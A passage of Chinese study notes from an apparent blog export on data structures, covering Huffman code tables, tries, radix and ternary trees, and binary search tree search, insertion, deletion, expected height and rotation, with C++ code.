&#123;</span><br><span class="line">   <span class="keyword">if</span> ( IsLeaf ( *v ) ) <span class="comment">//若是叶节点（还有多种方法可以判断）</span></span><br><span class="line">      &#123;  table-&gt;put ( v-&gt;data.ch, code-&gt;bits2string ( length ) ); <span class="keyword">return</span>;  &#125;</span><br><span class="line">   <span class="keyword">if</span> ( HasLChild ( *v ) ) <span class="comment">//Left = 0</span></span><br><span class="line">      &#123; code-&gt;clear ( length ); generateCT ( code, length + <span class="number">1</span>, table, v-&gt;lc ); &#125;</span><br><span class="line">   <span class="keyword">if</span> ( HasRChild ( *v ) ) <span class="comment">//Right = 1</span></span><br><span class="line">      &#123; code-&gt;<span class="built_in">set</span> ( length ); generateCT ( code, length + <span class="number">1</span>, table, v-&gt;rc ); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HuffTable* <span class="title">generateTable</span> <span class="params">( HuffTree* tree )</span> </span>&#123; <span class="comment">//将各字符编码统一存入以散列表实现的编码表中</span></span><br><span class="line">   HuffTable* table = <span class="keyword">new</span> HuffTable; Bitmap* code = <span class="keyword">new</span> Bitmap;</span><br><span class="line">   generateCT ( code, <span class="number">0</span>, table, tree-&gt;root() ); release ( code ); <span class="keyword">return</span> table;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>每迭代一次，森林的规模减1,故共需迭代n-1此，直到只剩一棵树。<code>minHChar()</code> 每次都要遍历森林中所有的超字符，所需时间线性正比于当时森林的规模。因此总体运行时间应为：</p>
<p>$O(1)+O(n-1)+…+O(2)=O(n^2)$</p>
<blockquote>
<p>任何CBA式huffman树构造算法在最坏情况下都需要运行$\Omega(nlog n)$时间</p>
</blockquote>
<p>只需建立一个从排序问题到huffman编码树问题的线性归约</p>
<p>事实上，对于每一个待排序的输入序列，我们都将其视为一组字符的出现频率。不失一般性，假设每个元素非负，否则可在$O(n)$时间内令它们增加同一足够大的正数。</p>
<p>以这组频率作为输入，可以调用任何CBA式算法构造出huffman编码树，一旦得到这样一棵编码树，只需一趟层次遍历，即可在$O(n)$时间内得到所有叶节点的遍历序列。</p>
<p>根据huffman编码树的定义，该树必然是单调的。因此，整个过程也等效于同时完成了对原输入序列的排序。</p>
<p>若待编码字符集已按出现频率排序，则huffman编码可以更快完成。始终将森林中的树分为两类：单节点(尚未参与合并)和多节点(已合并过)。每经过一次迭代，后者虽不见得增多，但必然有一个新成员。</p>
<p>根据huffman编码树的原理，每次迭代都是在当前森林中选取权重最小的两棵树合并，因此，被选出的树权重必然单调非降，故在当前所有(经合成生成后)多节点树中，最新者的权重必然最大。</p>
<p>将以上两类节点组织为两个队列，初始状态下，所有字符按照权重非降的次序存入单节点的队列，而多节点的队列，直接置空。此后的过程与常规的huffman编码树类似，反复取出权重最小的两棵树，将其合并后插回森林，直至最后只剩下一棵树</p>
<h1 id="键树"><a href="#键树" class="headerlink" title="键树"></a>键树</h1><p><strong>关联数组</strong>（<strong>Associative Array</strong>），又称<strong>映射</strong>（<strong>Map</strong>）、<strong>字典</strong>（<strong>Dictionary</strong>）是一个抽象的数据结构、，它包含着类似于（键，值）的有序对。一个关联数组中的有序对可以重复（如C++中的multimap）也可以不重复（如C++中的map)。</p>
<p>Trie在计算机科学中又称前缀树和键树，是一种保存关联数组的有序树，其中的键通常是字符串。与<a href="https://zh.wikipedia.org/wiki/%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91">二叉查找树</a>不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的<a href="https://zh.wikipedia.org/wiki/%E5%89%8D%E7%BC%80">前缀</a>，也就是这个节点对应的字符串，而根节点对应<a href="https://zh.wikipedia.org/wiki/%E7%A9%BA%E5%AD%97%E7%AC%A6%E4%B8%B2">空字符串</a>。一般情况下，不是所有的节点都有对应的值，只有叶子节点和部分内部节点所对应的键才有相关的值。</p>
<p>Trie这个术语来自于re<strong>trie</strong>val，trie树常用于搜索提示。如当输入一个网址，可以自动搜索出可能的选择。当没有完全匹配的搜索结果，可以返回前缀最相似的可能。</p>
<p>任一字符串集s都可表示为一棵键树。键树是有根有序树，其中每个节点均有r个分支，深度为d的节点对应于长度为d的字符串，祖先对应的字符串必定为后代所对应字符串的前缀。键树只保留与S中字符串相对应的节点，其余分支均标记为null。</p>
<p>因为并不确保字符串相互不为前缀，所以对应于完整字符串的节点未必是叶子，每个非空指针通过标志位来表明是否表示s中某个完整的字符串。</p>
<p>基于键树实现词典的<code>get()</code>,<code>put()</code>,<code>remove()</code>接口时间复杂度分别为$O(h)$,$O(hr)$,$O(hr)$。</p>
<blockquote>
<p>若以向量实现键树，则put(),remove()复杂度中的因子r不可消除</p>
</blockquote>
<p>在最坏情况下，在创建每个节点后，都需要花费$O(r)$时间，将对应向量中的每个指针都初始化为NULL。</p>
<p>同样，在最坏情况下，在删除每个节点后，都需要花费$O(r)$时间确认对应向量是否都是NULL。</p>
<p>以上方式在最坏情况下需要$\Omega(nr)$空间，其中$n=|s|$为字符串的规模。若s中的字符串均互不为前缀，则每个字符串都将对应于一个叶节点。于是，即便只计入这$n$个叶节点，累计空间总量为$\Omega(nr)$。</p>
<p>若用链表来实现各节点，每个节点的规模与实际的分支数成正比，每个字符串的每个字符至多占用$O(1)$空间，故所需空间总量线性正比于S中所有字符串的长度总和，同时，在每个节点需要$O( r )$时间顺序查找以确定深入的分支方向。get()接口的效率将降至$O(hr)$,其中h为树高，同时也是S中字符串的最大长度。</p>
<h2 id="基数树"><a href="#基数树" class="headerlink" title="基数树"></a>基数树</h2><p>键树中往往包含大量的单分支节点，通过折叠合并相邻的单分支节点，进一步提高键树的效率。</p>
<p><strong>基数树</strong>，或称Patricia trie/tree，或crit bit tree，<strong>压缩前缀树</strong>，是一种更节省空间的Trie（前缀树）。对于基数树的每个节点，如果该节点是唯一的子树的话，就和父节点合并。一棵Patricia Trie的任何内部结点有2个或以上的孩子结点。</p>
<p>将向量地单分支节点合成一个大节点，尽管一定程度上可以提高时、空效率，但是在渐进意义上并无实质改进。</p>
<p>应用：</p>
<ul>
<li>构建<a href="https://zh.wikipedia.org/wiki/%E5%85%B3%E8%81%94%E6%95%B0%E7%BB%84">关联数组</a></li>
<li>用于<a href="https://zh.wikipedia.org/wiki/IP">IP</a> <a href="https://zh.wikipedia.org/wiki/%E8%B7%AF%E7%94%B1">路由</a></li>
<li> <a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2">信息检索</a>中用于文本文档的<a href="https://zh.wikipedia.org/wiki/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95">倒排索引</a>。</li>
</ul>
<h2 id="三叉树"><a href="#三叉树" class="headerlink" title="三叉树"></a>三叉树</h2><p>Trie树结构，它的实现简单但空间效率低。如果要支持26个英文字母，每个节点就要保存26个指针，假若我们还要支持国际字符、标点符号、区分大小写，内存用量就会急剧上升，以至于不可行。</p>
<p>类似于二叉查找树，三叉查找树(ternarry tree)可以用于实现带前缀搜索功能的关联数组。比标准的前缀树更省空间，但是查找速度有所下降。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>二叉搜索树</title>
    <url>/algorithm/bst/</url>
    <content><![CDATA[<p>任何词条之间可相互比较大小是有序向量得以定义，以及二分查找赖以成立的基本前提。通过对二分查找策略的抽象和推广，定义和实现二叉搜索树结构。二叉搜索树有诸多变种，各具特色，各有所长，也有各自适用范围。为有效控制树高，二叉树的性能主要取决于树高，故应在节点数目一定的情况下尽可能地减小树高，相应地，尽可能使兄弟子树地高度彼此接近，即全树尽可能地平衡。平衡二叉搜索树通过对树中每一局部增加某种性质来保证二叉树的适度平衡性。</p>
<a id="more"></a>

<p>查找，即按照事先约定的规则，从数据集合中找出符合特定条件的对象，属于基本的静态操作。</p>
<p>基本的数据结构(列表和向量)并不能高效地兼顾静态查找和动态修改操作。</p>
<table>
<thead>
<tr>
<th>基本结构</th>
<th>查找</th>
<th>插入/删除</th>
</tr>
</thead>
<tbody><tr>
<td>无序向量</td>
<td>$O( n )$</td>
<td>$ O( n )$</td>
</tr>
<tr>
<td>有序向量</td>
<td>$O(logn)$</td>
<td>$ O(n)$</td>
</tr>
<tr>
<td>无序列表</td>
<td>$O( n )$</td>
<td>$O(1)$</td>
</tr>
<tr>
<td>有序列表</td>
<td>$O(n)$</td>
<td>$O(n)$</td>
</tr>
</tbody></table>
<h1 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h1><h2 id="顺序性"><a href="#顺序性" class="headerlink" title="顺序性"></a>顺序性</h2><p>在所谓的二叉搜索树中，处处都满足顺序性：</p>
<p><strong>任一节点r的左(右)子树中，所有节点(若存在)，均不大于(不小于)r</strong></p>
<p>为了回避边界情况，暂且假定所有节点互不相等，于是上述顺序性可简化表述为：</p>
<p><strong>任一节点r的左(右)子树中，所有节点(若存在)，均小于(大于)r</strong></p>
<p>当然，在实际应用中，对相等元素的禁止既不自然也不必要，可以对现有结构进行扩展，使二叉搜索树的接口支持相等词条的同时并存。</p>
<h2 id="单调性"><a href="#单调性" class="headerlink" title="单调性"></a>单调性</h2><p>在微观上满足顺序性，在宏观上满足单调性，单调性：</p>
<p><strong>BST的中序遍历序列，必然单调非降</strong></p>
<p>考查二叉树中的任一节点$r$，按照中序遍历的约定，$r$左(右)子树中的节点(若存在)均应先于(后于)r接受访问。</p>
<p>按照二叉搜索树的定义，$r$左(右)子树中的节点(若存在)均不大于(不小于)$r$，故中序遍历序列必然在r处单调非降，反之亦然。</p>
<p>鉴于以上所取$r$的任意性，在二叉搜索树中处处成立。</p>
<p>二叉搜索树的定义无法更改为<strong>任意节点的左(右)孩子均不大于(不小于)r</strong>，即将原来定义中的左(右)后代替换为左(右)孩子。满足这一定义的树未必中序遍历序列单调非降。</p>
<h2 id="查找算法"><a href="#查找算法" class="headerlink" title="查找算法"></a>查找算法</h2><p>二叉搜索树的查找算法采取了减而治之的思路和策略，执行过程可描述为：</p>
<p><strong>从树根出发，逐步地缩小查找范围，直到发现目标(成功)或缩小至空树(失败)</strong></p>
<p>对照中序遍历来看，整个过程可视为仿效有序向量的二分查找。</p>
<p><strong>递归版</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">template &lt;typename T&gt; BinNodePosi(T) &amp; BST&lt;T&gt;::search ( const T&amp; e ) &#x2F;&#x2F;在BST中查找关键码e</span><br><span class="line">&#123; return searchIn ( _root, e, _hot &#x3D; NULL ); &#125; &#x2F;&#x2F;返回目标节点位置的引用，以便后续插入、删除操作</span><br><span class="line">template &lt;typename T&gt; &#x2F;&#x2F;在以v为根的（AVL、SPLAY、rbTree等）BST子树中查找关键码e</span><br><span class="line">static BinNodePosi(T) &amp; searchIn ( BinNodePosi(T) &amp; v, const T&amp; e, BinNodePosi(T) &amp; hot ) &#123;</span><br><span class="line">   if ( !v || ( e &#x3D;&#x3D; v-&gt;data ) ) return v; &#x2F;&#x2F;递归基：在节点v（或假想的通配节点）处命中</span><br><span class="line">   hot &#x3D; v; &#x2F;&#x2F;一般情况：先记下当前节点，然后再</span><br><span class="line">   return searchIn ( ( ( e &lt; v-&gt;data ) ? v-&gt;lc : v-&gt;rc ), e, hot ); &#x2F;&#x2F;深入一层，递归查找</span><br><span class="line">&#125; &#x2F;&#x2F;返回时，返回值指向命中节点（或假想的通配哨兵），hot指向其父亲（退化时为初始值NULL）</span><br></pre></td></tr></table></figure>
<p><strong>迭代版</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) &amp; BST&lt;T&gt;::search ( <span class="keyword">const</span> T&amp; e ) <span class="comment">//在BST中查找关键码e</span></span><br><span class="line">&#123; <span class="keyword">return</span> searchIn ( _root, e, _hot = <span class="literal">NULL</span> ); &#125; <span class="comment">//返回目标节点位置的引用，以便后续插入、删除操作</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EQUAL(e, v)  (!(v) || (e) == (v)-&gt;data) <span class="comment">//节点v（或假想的通配哨兵）的关键码等于e</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//在以v为根的（AVL、SPLAY、rbTree等）BST子树中查找关键码e</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BinNodePosi</span><span class="params">(T)</span> &amp; <span class="title">searchIn</span> <span class="params">( BinNodePosi(T) &amp; v, <span class="keyword">const</span> T&amp; e, BinNodePosi(T) &amp; hot )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> ( EQUAL ( e, v ) ) <span class="keyword">return</span> v; hot = v; <span class="comment">//退化情况：在子树根节点v处命中</span></span><br><span class="line">   <span class="keyword">while</span> ( <span class="number">1</span> ) &#123; <span class="comment">//一般地，反复不断地</span></span><br><span class="line">      BinNodePosi(T) &amp; c = ( e &lt; hot-&gt;data ) ? hot-&gt;lc : hot-&gt;rc; <span class="comment">//确定深入方向</span></span><br><span class="line">      <span class="keyword">if</span> ( EQUAL ( e, c ) ) <span class="keyword">return</span> c; hot = c; <span class="comment">//命中返回，或者深入一层</span></span><br><span class="line">   &#125; <span class="comment">//hot始终指向最后一个失败节点</span></span><br><span class="line">&#125; <span class="comment">//返回时，返回值指向命中节点（或假想的通配哨兵），hot指向其父亲（退化时为初始值NULL）</span></span><br></pre></td></tr></table></figure>
<p>运行时间正比于返回节点v的深度，不超过树高$O(h)$。最好情况下目标关键码刚好出现在树根节点处(或附近)，此时只需$O(1)$时间。最坏情况下，规模为$n$的二叉搜索树深度可能达到$\Omega(n)$,比如该树退化为一条单链时，此时的查找等效于顺序查找。</p>
<p>节点的插入和删除操作都需要首先调用查找算法，并根据查找结果确定后续的处理方式，这里以引用的方式传递(子)树根节点。在成功时指向一个关键码为e且真实存在的节点，失败时，指向最后一次试图转向的空节点<code>null</code>。对于后一情况，可假想地将此节点转换为一个数值为e的哨兵节点，如此，无论命中与否，查找的返回值均等效地指向命中节点,而<code>hot</code>总是指向命中节点的父亲。</p>
<blockquote>
<p>无论树的具体形态如何，查找必然有n种成功情况和n+1种失败情况</p>
</blockquote>
<p>通过对树高数学归纳可以证明。</p>
<p>假设原有二叉树度数为0、1、2的节点，各有$n_0$,$n_1$,$n_2$个。</p>
<p>在原有二叉搜索树的基础上，引入$n_1+2n_0$个外部节点，可使原有节点度数统一为2，如此，即可将任一二叉搜索树T转化为一棵真二叉树T’。s设T’度数为0、1、2的节点，分别为$n’_0,n’_1,n’_2$。查找失败的情况必定对应于外部节点。</p>
<p>由树的性质，有$e’=n’-1=n’_1+2n’_2$</p>
<p>$n’=n’_0+n_1+n’_2=1+2n_1+n_2$</p>
<p>此时所有节点均为二度节点，则$n’_1=0$</p>
<p>$n’_0=n’_2+1$</p>
<p>注意到此时的零度节点数量即等于引入的外部节点，即$n’_0=n_1+2n_0$</p>
<p>二度节点即为原来的节点总数$n’_2=n_0+n_1+n_2=n$</p>
<p>即$n’_0=n+1$,查找失败的情况总数即是外部节点的数目。</p>
<p>查找成功的情况总数即是二叉搜索树的节点总数$n$,得证。</p>
<h2 id="插入算法"><a href="#插入算法" class="headerlink" title="插入算法"></a>插入算法</h2><p>为了在二叉搜索树中插入一个顶点，首先需要利用查找算法<code>search()</code> 确定插入的位置和方式，然后才能将新节点作为叶子插入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; BinNodePosi(T) BST&lt;T&gt;::insert ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//将关键码e插入BST树中</span></span><br><span class="line">   BinNodePosi(T) &amp; x = search ( e ); <span class="keyword">if</span> ( x ) <span class="keyword">return</span> x; <span class="comment">//确认目标不存在（留意对_hot的设置）</span></span><br><span class="line">   x = <span class="keyword">new</span> BinNode&lt;T&gt; ( e, _hot ); <span class="comment">//创建新节点x：以e为关键码，以_hot为父</span></span><br><span class="line">   _size++; <span class="comment">//更新全树规模</span></span><br><span class="line">   updateHeightAbove ( x ); <span class="comment">//更新x及其历代祖先的高度</span></span><br><span class="line">   <span class="keyword">return</span> x; <span class="comment">//新插入的节点，必为叶子</span></span><br><span class="line">&#125; <span class="comment">//无论e是否存在于原树中，返回时总有x-&gt;data == e</span></span><br></pre></td></tr></table></figure>
<p>这里需要注意，在创建新节点$x$的时候，只是指定了父亲为$hot$，并没有指定$hot$的左孩子还是右孩子为$x$。在前一步的<code>search</code>过程中，返回了命中节点的引用，通过对$x$的赋值来连接父子节点，同时也将$x$接入树中。</p>
<p>插入操作必定在叶节点处，同样取决于节点的深度，在最坏情况下不超过全树的高度，即最深的叶子的深度。</p>
<blockquote>
<p>在二叉树树中插入节点v之后，除v的历代祖先外，其余节点的高度无需更新</p>
</blockquote>
<p>节点的高度仅取决于其后代，更确切地，是该节点与其最深后代之间的距离。因此在插入节点$v$之后，节点$a$的高度可能发生变化，当且仅当$v$是$a$的后代，或反过来等价地，a是v的祖先。</p>
<blockquote>
<p>祖先高度不会降低，但是至多加一</p>
</blockquote>
<p>插入节点$v$之后，所有节点的后代集不至缩小。高度取决于后代深度的最大值，故不至于下降。<br>另外一方面，假定节点$a$的高度由$h$增加至$h’$。若将$v$的父节点记作$p$,则$a$到$p$的距离不大于$a$在此之前的高度，于是必有：</p>
<p>$h’ \leq |ap|+1 \leq h+1$</p>
<blockquote>
<p>一旦某个祖先高度不变，则更高的祖先高度也必然高度不变</p>
</blockquote>
<p>对于任意节点$p$，若将其左、右孩子分别记作$l$和$r$(可能为空)，则必有：</p>
<p>$height(p)=1+max(height(l),height(r))$</p>
<p>在插入节点$v$之后，在$l$和$r$之间，至多其一可能会(作为$v$的祖先)有所变化。一旦该节点的高度不变，$p$以及更高层祖先(如果存在的话)的高度亦保持不变。</p>
<h2 id="删除算法"><a href="#删除算法" class="headerlink" title="删除算法"></a>删除算法</h2><p><strong>单分支情况</strong></p>
<p>若节点x的某一子树为空，则可将其替换为另一棵子树(可能亦为空)，如此操作后，二叉搜索树的拓扑结构依然完整，顺序性同样满足。</p>
<p><strong>双分支情况</strong></p>
<p>l除了更新全树规模和释放被摘除节点外，此时也要更新一系列祖先高度，首个需要更新的祖先恰好为<code>hot</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">bool</span> BST&lt;T&gt;::remove ( <span class="keyword">const</span> T&amp; e ) &#123; <span class="comment">//从BST树中删除关键码e</span></span><br><span class="line">   BinNodePosi(T) &amp; x = search ( e ); <span class="keyword">if</span> ( !x ) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//确认目标存在（留意_hot的设置）</span></span><br><span class="line">   removeAt ( x, _hot ); _size--; <span class="comment">//实施删除</span></span><br><span class="line">   updateHeightAbove ( _hot ); <span class="comment">//更新_hot及其历代祖先的高度</span></span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="comment">//删除成功与否，由返回值指示</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BinNodePosi</span><span class="params">(T)</span> <span class="title">removeAt</span> <span class="params">( BinNodePosi(T) &amp; x, BinNodePosi(T) &amp; hot )</span> </span>&#123;</span><br><span class="line">   BinNodePosi(T) w = x; <span class="comment">//实际被摘除的节点，初值同x</span></span><br><span class="line">   BinNodePosi(T) succ = <span class="literal">NULL</span>; <span class="comment">//实际被删除节点的接替者</span></span><br><span class="line">   <span class="keyword">if</span> ( !HasLChild ( *x ) ) <span class="comment">//若*x的左子树为空，则可</span></span><br><span class="line">      succ = x = x-&gt;rc; <span class="comment">//直接将*x替换为其右子树</span></span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span> ( !HasRChild ( *x ) ) <span class="comment">//若右子树为空，则可</span></span><br><span class="line">      succ = x = x-&gt;lc; <span class="comment">//对称地处理——注意：此时succ != NULL</span></span><br><span class="line">   <span class="keyword">else</span> &#123; <span class="comment">//若左右子树均存在，则选择x的直接后继作为实际被摘除节点，为此需要</span></span><br><span class="line">      w = w-&gt;succ(); <span class="comment">//（在右子树中）找到*x的直接后继*w</span></span><br><span class="line">      swap ( x-&gt;data, w-&gt;data ); <span class="comment">//交换*x和*w的数据元素</span></span><br><span class="line">      BinNodePosi(T) u = w-&gt;parent;</span><br><span class="line">      ( ( u == x ) ? u-&gt;rc : u-&gt;lc ) = succ = w-&gt;rc; <span class="comment">//隔离节点*w</span></span><br><span class="line">   &#125;</span><br><span class="line">   hot = w-&gt;parent; <span class="comment">//记录实际被删除节点的父亲</span></span><br><span class="line">   <span class="keyword">if</span> ( succ ) succ-&gt;parent = hot; <span class="comment">//并将被删除节点的接替者与hot相联</span></span><br><span class="line">   release ( w-&gt;data ); release ( w ); <span class="keyword">return</span> succ; <span class="comment">//释放被摘除节点，返回接替者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>算法操作所需的时间主要消耗于对<code>search()</code>，<code>succ()</code>，<code>updateHeightAbove()</code>的调用。在树的任意高度，它们至多消耗$O(1)$时间，故总体的渐进时间复杂度亦不超过全树的高度。</p>
<blockquote>
<p>从二叉搜索树中删除节点，若实际被删除的节点为x,则此后除x的历代祖先外，其余节点的高度无需更新</p>
</blockquote>
<p>节点的高度仅取决于其后代，更确切地，是该节点与其最深后代之间的距离。因此在插入节点v之后，节点a的高度可能发生变化，当且仅当v是a的后代，或反过来等价地，a是v的祖先。</p>
<blockquote>
<p>祖先高度不会降低，但是至多减一</p>
</blockquote>
<p>假设在删除节点x之后，祖先节点a的高度由h变化至h’。假想将x重新插回树中，于是自然地，a的高度应该从h恢复至h，由插入的结论，必有：</p>
<p>$h\leq h’+1$</p>
<p>亦即$h’ \geq h-1$</p>
<blockquote>
<p>一旦某个祖先高度不变，更高的祖先也必然高度不变</p>
</blockquote>
<p>反正，假设在删除节点x之后，祖先节点高度会间隔地下降和不变。</p>
<p>假想将x重新插入树中，所有节点的高度均应复原，而祖先节点的高度则必然间隔地上升和不变，这一结论与之前插入的结论不一致。</p>
<p>在逐层上行更新祖先高度时，一旦某一祖先的高度不变，便可随即终止。</p>
<h2 id="期望树高"><a href="#期望树高" class="headerlink" title="期望树高"></a>期望树高</h2><p>BST主要接口<code>search()</code>，<code>insert()</code>，<code>remove()</code>的运行时间在最坏情况下均线性正比于其高度$O(h)$。</p>
<p>若无法有效控制树高，在最坏情况下，二叉搜索树可能彻底地退化为列表，查找效率降至$O(n)$,线性正比于树(列表)规模。</p>
<p>以下按照两种常用的随机统计方法对BST的平均性能进行分析</p>
<p><strong>随机生成</strong></p>
<p>考察$n$个互异词条${e_1,e_2,..,e_n}$,对任一排列$P=(e_{i1},e_{i2},…,e_{in})$</p>
<p>从空树开始，反复调用<code>insert()</code>接口将各词条依次插入，得到T</p>
<p>与随机序列$P$对应的$T$，称由$P$随机生成。</p>
<p>假定任一排列$P$作为输入的概率均等$1/n!$</p>
<p>则由$n$个互异词条随机生成的二叉搜索树，平均高度为$\Theta(logn)$</p>
<p><strong>随机组成</strong></p>
<p>n个互异节点在遵守顺序性的情况下，可随机确定拓扑联接关系</p>
<p>如此得到的BST，称由这组节点随机组成。</p>
<p>由同一节点组成的二叉搜索树不尽相同，但是中序遍历序列必然相同，不妨记作</p>
<p>$x_0$,$x_1$,$x_2$,…,$x_{k-1}$,$x_k$,$x_{k+1}$,$x_{k+2}$,…,$x_{n-1}$</p>
<p>根据所选树根节点的不同，所有搜索树分为$n$类，对于其中以$x_{k}$为根者而言，左、右子树必然分别由{$x_0$,$x_1$,$x_2$,…,$x_{k-1}$}和{$x_{k+1}$,$x_{k+2}$,…,$x_{n-1}$}组成。</p>
<p>如此，可得边界条件和递推式如下：</p>
<p>$T(0)=T(1)=1$</p>
<p>由$n$个互异节点组随机组成的BST，若共计$T(n)$棵，则有<br>$$<br>T(n)=\sum_{k=1}^{n-1} T(k-1)T(n-k)=catalan(n)=\frac{(2n)!}{n!(n+1)!}<br>$$<br>假定所有BST等概率出现，则其平均高度为$\Theta(\sqrt n)$</p>
<p>在随机生成的统计方法中，越低的BST被统计多次，故过于乐观。理想随机在实际中并不常见，关键码往往按单调甚至线性的次序出现，极高的BST频繁出现不足为奇。</p>
<blockquote>
<p>在目标节点同时拥有左右子树的时候，总是固定选取直接后继与之交换，从二叉树的整个生命周期来看，左子树将越来越倾向于高于右子树，从而加剧整体的不平衡性</p>
</blockquote>
<p>一种简捷的策略为除直接后继外还考虑直接前驱，并在二者之间随机选取。</p>
<h1 id="平衡二叉搜索树"><a href="#平衡二叉搜索树" class="headerlink" title="平衡二叉搜索树"></a>平衡二叉搜索树</h1><p>二叉搜索树的性能主要取决于树高，故在节点数目固定时应尽可能地降低高度。</p>
<p>节点数目固定时，兄弟子树的高度越接近(平衡)，全树也倾向于更低。</p>
<p>若高度为$h$的二叉树共含$n$个节点，则必有：</p>
<p>$n\leq 2^{h+1}-1$<br>这里的等号成立，当且仅当是满树。于是有：</p>
<p>$h \geq log_2(n+1)-1 $</p>
<p>$h \geq \lceil log_2{n+1} \rceil-1=\lfloor log_2n \rfloor$</p>
<p>恰好为$\lfloor log_2n \rfloor$时，称作理想平衡。大致相当于完全树甚至满树：叶节点只能出现在最底部的两层。完全二叉树的限制过于苛刻相对二叉树所有可能的形态，此类二叉树所占比例极低，而随着二叉树规模的增大，这一规模还将继续锐减。所以对标准适度放松，依照某种相对宽松的标准，重新定义二叉搜索树的平衡性。</p>
<p>高度在渐进意义上不超过$O(logn)$，故可称作适度平衡。适度平衡的BST，称作平衡二叉搜索树。</p>
<h2 id="等价变换"><a href="#等价变换" class="headerlink" title="等价变换"></a>等价变换</h2><p>若两棵二叉树的中序遍历序列相同，则称它们彼此等价。</p>
<p><strong>上下可变</strong></p>
<p>联接关系不同，承袭关系可能颠倒</p>
<p><strong>左右不乱</strong></p>
<p>中序遍历序列完全一致，全局单调非降</p>
<p>各种平衡二叉搜索树(BBST)可视为BST的某一子集，相应地满足限制条件。除了适度平衡性，还具有如下局部性：</p>
<ul>
<li>单次动态修改操作后，至多$O(logn)$处局部不再满足限制条件</li>
<li>可在$O(logn)$时间内，使这些局部(以至全树)重新满足</li>
</ul>
<p>刚刚失去平衡的二叉搜索树，必然可以迅速转换为一棵等价的平衡二叉搜索树。等价二叉搜索树之间的上述转换过程，也称作等价变换。</p>
<h2 id="旋转调整"><a href="#旋转调整" class="headerlink" title="旋转调整"></a>旋转调整</h2><p>修复局部失衡的最基本手段，就是通过围绕特定节点的旋转，实现等价前提下的拓扑调整。</p>
<p>设$c$和$Z$是$v$左孩子、右子树，$X$和$Y$是$c$的左、右子树。以$v$为轴的zig旋转，如图所示，重新调整这两个节点和三棵子树之间的关系，将$X$和$v$作为$c$的左子树、右孩子，$Y$和$Z$分别作为$v$的左、右子树。</p>
<p>对称地，设$X$和$c$是$v$左子树、右孩子，$Y$和$Z$是$c$的左、右子树。以$v$为轴的zig旋转，如图所示，重新调整这两个节点和三棵子树之间的关系，将$X$和$Y$作为$v$的左子树、右子树，$v$和$Z$分别作为$c$的左孩子、右子树。</p>
<p>zig和zag均属于局部操作，旋转以后中序遍历序列依然不变，故均为等价变换。旋转操作仅涉及常数顶点及其之间的联接关系，故均可在常数时间内完成。</p>
<p><img src="https://i.loli.net/2019/09/05/frTd2gO7DXhIPZU.png"></p>
<p>调整之后，$v/c$深度加/减1，子(全)树高度的变化幅度，上下不超过1。实际上，经过不超过$O(n)$次旋转，等价的BST均可相互转化。</p>
<blockquote>
<p>规模为n的任何二叉搜索树，经过不超过n-1次旋转调整，都可等价变换为仅含左分支的二叉搜索树，即最左侧通路</p>
</blockquote>
<p><strong>任一节点需要通过一次旋转归入最左侧通路，当且仅当它最初不在最左侧通路上。</strong></p>
<p>故原最左侧通路的长度为$s$，则上述算法所做的旋转调整，恰好共计$n-s-1$次。</p>
<p>特别地，$s=0$(根节点的左子树为空),当且仅当需做$n-1$次旋转。</p>
<p>考查二叉搜索树的最左侧通路，从该通路的末端节点$L_d$开始，逐步迭代地延长该路径，直至不能延长。每次迭代，无非两种情况：</p>
<ul>
<li>若$L_k$的右子树为空，则可令$L_k$上移一层，转至其父节点</li>
<li>若$L_k$的右孩子$R_k$存在，则可以以当前$L_k$为轴，做一次zag旋转调整，如此，$R_k$将作为$L_k$的父亲纳入最左侧通路中。</li>
</ul>
<p>整个迭代过程的不变性为：</p>
<ul>
<li>当前$L_k$来自最左侧通路</li>
<li>$L_k$的左子树(由不大于$L_k$的所有节点组成)已不含任何右向分支</li>
</ul>
<p>另外，整个迭代过程也满足如下单调性：</p>
<p><strong>最左侧通路的长度，严格单调增加</strong></p>
<p>故该算法必然终止，且所得的二叉搜索树已不含任何右向分支。</p>
<p>以上思路具体实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过zag旋转调整，将BST子树x拉伸成最左侧通路</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="function"><span class="keyword">void</span> <span class="title">stretchByZag</span> <span class="params">( BinNodePosi(T) &amp; x )</span> </span>&#123;</span><br><span class="line">   BinNodePosi(T) p = x; <span class="keyword">while</span> ( p-&gt;rc ) p = p-&gt;rc; <span class="comment">//最大节点，必是子树最终的根</span></span><br><span class="line">   <span class="keyword">while</span> ( x-&gt;lc ) x = x-&gt;lc; <span 